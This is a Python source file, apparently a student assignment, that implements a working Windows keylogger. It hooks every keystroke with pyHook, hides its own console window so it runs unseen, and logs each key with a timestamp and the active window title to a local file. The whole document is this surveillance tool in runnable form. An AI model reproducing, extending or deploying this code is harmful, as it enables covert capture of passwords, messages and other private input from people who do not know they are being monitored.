# Python code for keylogger
# to be used in windows
import win32api
import win32console
import win32gui
import win32con
import pythoncom, pyHook
from datetime import datetime
import logging
import keyboard

invert = {
	'!' : '1',
	'@' : '2',
	'#' : '3',
	'$' : '4',
	'%' : '5',
	'^' : '6',
	'&' : '7',
	'*' : '8',
	'('	: '9',
	')' : '0',
	'_' : '-',
	'+' : '-',
	'{' : '[',
	'}' : ']',
	'|' : '\\',
	':' : ';',
	'\"' : '\'',
	'<' : ',',
	'>' : '.',
	'?' : '/',
	'~' : '`'
}

no_output = {
	1  : 'esc',
	15 : 'tab',
	58 : 'capslock',
	42 : 'shift left',
	91 : 'windows',
	56 : {33 : 'alt  left', 32 : 'alt right'},
	29 : {1 : 'ctrl right', 0 : 'ctrl left'},
	72 : 'up',
	80 : 'down',
	75 : 'left',
	77 : 'right',
	54 : 'shift left',
	28 : 'enter',
	14 : 'backspace',
	83 : 'del',
	82 : 'insert',
	69 : 'pause break',
	55 : 'print screen',
	59 : 'f1',
	60 : 'f2',
	61 : 'f3',
	62 : 'f4',
	63 : 'f5',
	64 : 'f6',
	65 : 'f7',
	66 : 'f8',
	67 : 'f9',
	68 : 'f10',
	87 : 'f11',
	88 : 'f12'
}


win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

#output = "C:/Users/ianng/Desktop/CODE/6841/ass/LOG.txt"
output = "./log.txt"

def OnKeyboardEvent(event):
	CAPS = win32api.GetKeyState(win32con.VK_CAPITAL)
	

	logging.basicConfig(filename=output, level=logging.DEBUG, format='%(message)s')
	#print(event.__dict__)
	#print(type(event.flags))
	
	if event.ScanCode in no_output:
		#key pressed is a non output key, so we have to identify it by its scancode
		
		scan_code = event.ScanCode
		flag = event.flags

		if scan_code == 56 or scan_code == 29:
			x = no_output[scan_code][flag]
		else:
			x = no_output[scan_code]

	else:
		#key pressed is an ascii character
		keylogs = chr(event.Ascii)
		x = keylogs


		#capslock and shift logic

		if CAPS == 1:
			if keyboard.is_pressed('shift'):

				if keylogs.isalpha():
					x = keylogs.lower()
				
			else:
				#only alphabet is capitalised! everything else is inverted
				if not keylogs.isalpha() and keylogs in invert:
					x = invert[keylogs]

		else:
			#caps is off
			if keyboard.is_pressed('shift'):
				x = keylogs
			else:
				if keylogs.isalpha():
					x = keylogs.lower()
				else:
					if keylogs in invert:
						x = keylogs = invert[keylogs]

	s = str(x) + " time: " + str(datetime.now()) + " window: " + str(event.WindowName) + "\n"
	logging.log(10, s)
	print(s)


	return True


# create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
